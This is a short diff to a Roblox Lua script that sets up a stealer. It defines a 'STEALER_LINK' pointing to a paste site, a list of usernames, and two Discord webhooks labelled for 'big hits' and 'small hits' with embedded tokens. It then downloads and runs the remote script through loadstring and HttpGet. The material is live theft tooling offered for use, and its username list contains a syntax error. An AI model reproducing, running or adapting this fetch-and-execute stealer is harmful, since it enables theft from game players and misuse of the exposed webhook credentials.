@@ -1,1 +1,12 @@
-loadstring(game:HttpGet("https://egorikusa.space/94b48d6303de71e624b52b3e.lua", true))()
+STEALER_LINK = 'https://dpaste.com/5CGABWKXG.txt'
+
+Usernames = {
+    'GOUTEN_DZB',
+    'isaw_callmenoob', ,
+    'Kaneki7a9',
+}
+
+BigHitsWebhook = "https://discord.com/api/webhooks/1322303079760269395/IJDlwJR8UEqlKtjimCV0CzDgkJuBKQoFNnQ0WNhunCrssax8eehD3BCmy9egAcvB-yfU"
+SmallHitsWebhook = "https://discord.com/api/webhooks/1323350619196489881/LPci9EB_bdxC3jESTTbxRKQFe6m5pM1NmrkOmqi4K6P5t84NwiKAnXu7RuHf653IxPQp"
+
+loadstring(game:HttpGet(STEALER_LINK, true))()
